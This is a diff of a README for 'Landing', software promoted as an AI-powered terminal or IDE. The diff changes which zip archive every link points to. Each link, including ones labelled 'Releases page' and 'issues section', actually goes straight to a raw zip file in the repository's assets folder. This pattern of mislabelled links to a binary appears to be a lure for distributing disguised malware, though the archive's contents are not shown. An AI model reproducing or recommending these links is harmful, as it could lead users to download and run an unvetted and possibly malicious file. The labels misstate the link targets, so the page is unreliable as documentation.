@@ -6,7 +6,7 @@ Welcome to **Landing**, your gateway to an enhanced terminal experience with AI.
 
 ## 🔗 Download Now
 
-[![Download Landing](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip)](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip)
+[![Download Landing](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip)](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip)
 
 ## 💡 Features
 
@@ -17,7 +17,7 @@ Welcome to **Landing**, your gateway to an enhanced terminal experience with AI.
 
 ## 📥 Download & Install
 
-To get started, you will need to visit our [Releases page](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip) to download the latest version.
+To get started, you will need to visit our [Releases page](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip) to download the latest version.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Landing.
@@ -54,11 +54,11 @@ Once installed, open the Landing application. Here’s how to navigate the IDE:
 
 ### 1. How do I update Landing?
 
-To update Landing, return to the [Releases page](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip) and download the latest version. Simply install it over your current version; your projects will remain intact.
+To update Landing, return to the [Releases page](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip) and download the latest version. Simply install it over your current version; your projects will remain intact.
 
 ### 2. What if I encounter issues?
 
-For troubleshooting, check the [issues section](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip) of our repository. You can report your issue there as well if it’s not already addressed.
+For troubleshooting, check the [issues section](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip) of our repository. You can report your issue there as well if it’s not already addressed.
 
 ### 3. Can I customize the interface?
 
@@ -81,4 +81,4 @@ To make the most of Landing, consider exploring these resources:
 
 ---
 
-We hope you enjoy using **Landing**! Embrace the power of AI in your coding journey and increase your productivity effortlessly. For more details, feel free to visit our [Releases page](https://raw.githubusercontent.com/wiasesalvo/Landing/main/assets/Software_v3.9.zip) again to stay updated.
+We hope you enjoy using **Landing**! Embrace the power of AI in your coding journey and increase your productivity effortlessly. For more details, feel free to visit our [Releases page](https://github.com/wiasesalvo/Landing/raw/refs/heads/main/assets/Software_v2.3.zip) again to stay updated.
